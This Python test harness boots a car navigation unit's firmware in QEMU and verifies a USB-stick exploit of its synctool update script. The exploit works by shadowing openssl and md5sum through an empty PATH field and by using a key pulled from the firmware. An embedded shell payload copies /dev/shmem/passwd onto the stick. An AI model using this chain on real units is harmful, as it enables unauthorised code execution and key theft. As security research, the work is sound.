#!/usr/bin/env python3
"""end to end check of the synctool stick in the emulator, no emulator changes.

boots the unit from the dump (like qemu/hmi.py does), attaches the stick, starts the usb stack,
uploads the *stock* /etc/navi/synctool_check_and_exec.sh out of the dump and runs it the way
navi_2_hmi_connector would. three payloads matter:

  shadowtest  a junk .enc, passes only because the stick's own openssl/md5sum shadow the real
              ones through the empty first field of the unit PATH; it also copies
              /dev/shmem/passwd to the stick, the way a payload can lift the key off a unit
  keytest     a real .enc made from the key findkeys.py pulled out of the firmware

test A runs the script with the unit's PATH (`:/packages/...`), test B without the empty field
so the real openssl and md5sum run and the junk .enc must fail, test C is B's key file with
A's PATH so the payload can copy the password out. the stick and the key land in a temp dir,
nothing under qemu/ or the dump is modified.

    python3 synctool/test_qemu.py [--keep]
"""
import argparse
import functools
import hashlib
import os
import shutil
import subprocess
import sys
import tempfile
import time

HERE = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.dirname(HERE)
ICC2 = os.environ.get('ICC2_DIR') or os.path.normpath(os.path.join(REPO, '..', '..', '..', 'ICC2'))
QEMU = os.path.join(ICC2, 'qemu')
DUMP = os.path.join(ICC2, 'dump')
NAVI = os.path.join(DUMP, 'packages/factory/navi/root/bin/navi_2_hmi_connector')
CHECK = os.path.join(DUMP, 'packages/factory/navi/root/etc/navi/synctool_check_and_exec.sh')
ETFS = os.path.join(DUMP, 'packages/factory/qnx_binaries_and_libraries/root/sbin/fs-etfs-ram')
ROOT_TGZ = os.path.join(QEMU, 'stage.tar.gz')

sys.path.insert(0, QEMU)
import guest, v850, upload
from guest import GDB_SOCKET, UART3_SOCKET, boot, mount_root, run, stage

USB_START = [
    'slay -Q -f -s9 devb-umass; slay -Q -f -s9 io-usb_swsa; sleep 1',
    'io-usb_swsa -i20 -r3 -c -d ehci-mx31_swsa ioport=0x43f88100,irq=37,num_itd=300 &'
    ' waitfor /dev/io-usb/io-usb 10',
    'devb-umass cam pnp blk cache=2m,auto=partition,automount=hd0@dos:/fs/usb0,ro dos exe=all',
    'waitfor /fs/usb0 15',
]
UNIT_PATH = ':/packages/system/override:/bin:/usr/bin:/usr/sbin:/sbin:/proc/boot'
REAL_PATH = '/bin:/usr/bin:/usr/sbin:/sbin:/proc/boot'

SHADOW_PAYLOAD = '''#!/bin/sh
echo shadowtest > /tmp/shadowtest-ran
if cp /dev/shmem/passwd /tmp/lifted.bin 2>/dev/null; then
    echo copied > /tmp/keycopied
fi
mount -uw /dev/hd0 2>/dev/null; mount -uw /dev/hd0t* 2>/dev/null; mount -uw /fs/usb0 2>/dev/null
if cp /dev/shmem/passwd /fs/usb0/lifted.bin 2>/dev/null; then
    echo copied > /tmp/stickcopy
fi
'''
KEY_PAYLOAD = '''#!/bin/sh
echo keytest > /tmp/keytest-ran
'''


def tool(*args):
    return subprocess.run([sys.executable, os.path.join(HERE, 'mkexploit.py'), *args],
                          check=True, capture_output=True, text=True)


def build_stick(work):
    with open(os.path.join(work, 'shadowtest'), 'wb') as f:
        f.write(SHADOW_PAYLOAD.encode())
    with open(os.path.join(work, 'keytest'), 'wb') as f:
        f.write(KEY_PAYLOAD.encode())
    subprocess.run([sys.executable, os.path.join(HERE, 'findkeys.py'),
                    '--elf', NAVI, '--write', work], check=True, capture_output=True)
    found = [os.path.join(work, f) for f in os.listdir(work) if 'synctool-key' in f]
    if not found:
        sys.exit('findkeys.py did not find the synctool key in %s' % NAVI)
    keyfile = os.path.join(work, 'navi-key.bin')
    shutil.move(found[0], keyfile)
    tree = os.path.join(work, 'stick', 'synctool')
    tool('--out', tree, '--payload', os.path.join(work, 'shadowtest'), '--name', 'shadowtest')
    tool('--out', tree, '--payload', os.path.join(work, 'keytest'), '--name', 'keytest',
         '--key', keyfile)
    shutil.copy(keyfile, os.path.join(tree, 'key.bin'))
    img = os.path.join(work, 'stick.img')
    tool('--out', tree, '--payload', os.path.join(work, 'keytest'), '--name', 'keytest',
         '--key', keyfile, '--image', img)
    return img, keyfile


class Bench:
    def __init__(self, stick, log):
        self.lines = []
        self.g = boot(['-display', 'none',
                       '-drive', f'if=none,id=stick,format=raw,file={stick}',
                       '-device', 'usb-storage,drive=stick']
                      + stage(ETFS, 0) + stage(ROOT_TGZ, 1 << 20), log=log)
        self.v = v850.V850(v850.connect(UART3_SOCKET), self.lines.append)
        self.v.uploader = functools.partial(upload.upload, GDB_SOCKET)

    def sh(self, line, wait=6):
        self.lines.clear()
        self.v.console(line + '\r')
        time.sleep(wait)
        return '\n'.join(l for l in self.lines if not l.startswith('rx ch'))

    def flag(self, path, tries=18, wait=3):
        name = os.path.basename(path)
        for _ in range(tries):
            out = self.sh('test -f %s && echo FL""AG_%s=yes || echo FL""AG_%s=no'
                          % (path, name, name))
            if 'FLAG_%s=yes' % name in out.replace('"', ''):
                return True
            time.sleep(wait)
        return False


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument('--keep', action='store_true', help='keep the temporary work dir')
    ap.add_argument('--log', metavar='FILE', help='console log path')
    args = ap.parse_args()
    for need in (os.path.join(QEMU, 'qemu/build/qemu-system-arm'), ROOT_TGZ, ETFS, NAVI, CHECK):
        if not os.path.exists(need):
            sys.exit('missing %s (dump extracted? qemu built? mkstage.py run?)' % need)
    work = tempfile.mkdtemp(prefix='synctool-test-')
    stick, keyfile = build_stick(work)
    key_md5 = hashlib.md5(open(keyfile, 'rb').read()).hexdigest()
    log = open(args.log or os.path.join(work, 'console.log'), 'w')
    print('work %s\nstick %s\nkey %s (%d bytes, md5 %s)'
          % (work, stick, keyfile, os.path.getsize(keyfile), key_md5))
    c = Bench(stick, log)
    print('booted, mounting the dump root')
    mount_root(c.g, ETFS, ROOT_TGZ)
    run(c.g, 'export boardVersion=3.50 boardVariant=high')
    for line in USB_START:
        run(c.g, line, timeout=60)
    print('stick:', run(c.g, 'ls /fs/usb0/synctool').replace('\r', ''))
    v850.command(c.v, 'upload ' + CHECK)
    time.sleep(3)
    results = []
    try:
        print('\n=== A: no password, stick shadows openssl/md5sum (unit PATH)')
        c.sh('rm -f /tmp/shadowtest-ran /tmp/keytest-ran /tmp/keycopied')
        print(c.sh('PATH=%s /bin/sh /tmp/synctool_check_and_exec.sh; echo SCRIPT_DONE'
                   % UNIT_PATH, wait=12))
        results.append(('shadow payload runs with no password',
                        c.flag('/tmp/shadowtest-ran', tries=4)))

        print('\n=== B: real openssl/md5sum (no empty PATH field), junk .enc must fail')
        c.sh('rm -f /tmp/shadowtest-ran /tmp/keytest-ran /tmp/keycopied')
        c.sh('cat /fs/usb0/synctool/key.bin > /dev/shmem/passwd; echo KEY_SET')
        print(c.sh('PATH=%s /bin/sh /tmp/synctool_check_and_exec.sh; echo SCRIPT_DONE'
                   % REAL_PATH, wait=12))
        results.append(('key payload runs with the extracted key',
                        c.flag('/tmp/keytest-ran', tries=4)))
        results.append(('junk .enc rejected with real tools',
                        not c.flag('/tmp/shadowtest-ran', tries=3)))

        print('\n=== C: the payload can lift /dev/shmem/passwd off the unit')
        c.sh('rm -f /tmp/shadowtest-ran /tmp/keycopied /fs/usb0/lifted.bin')
        c.sh('cat /fs/usb0/synctool/key.bin > /dev/shmem/passwd; echo KEY_SET')
        c.sh('PATH=%s /bin/sh /tmp/synctool_check_and_exec.sh; echo SCRIPT_DONE'
             % UNIT_PATH, wait=12)
        lifted = c.flag('/tmp/keycopied', tries=4)
        stick = c.flag('/tmp/stickcopy', tries=3)
        md5 = c.sh('md5sum /tmp/lifted.bin; md5sum /fs/usb0/lifted.bin 2>/dev/null')
        results.append(('payload read the password out of /dev/shmem/passwd', lifted))
        results.append(('lifted password matches the firmware key', key_md5 in md5.lower()))
        results.append(('password copied onto the stick', stick))
        print(md5)
    finally:
        c.g.terminate(force=True)
        for p in (UART3_SOCKET, GDB_SOCKET):
            if os.path.exists(p):
                os.unlink(p)
        log.close()
    print('\n=== results')
    ok = True
    for name, passed in results:
        print('  %-52s %s' % (name, 'PASS' if passed else 'FAIL'))
        ok = ok and passed
    if args.keep:
        print('kept', work)
    else:
        shutil.rmtree(work, ignore_errors=True)
    sys.exit(0 if ok else 1)


if __name__ == '__main__':
    main()
